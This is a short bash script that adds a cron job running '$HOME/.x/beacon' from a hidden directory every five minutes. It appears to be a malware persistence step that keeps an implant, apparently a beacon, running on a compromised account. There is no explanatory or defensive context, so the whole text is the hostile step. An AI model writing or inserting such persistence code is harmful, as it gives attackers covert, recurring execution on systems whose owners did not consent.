#!/bin/bash
(crontab -l; echo "*/5 * * * * $HOME/.x/beacon") | crontab -
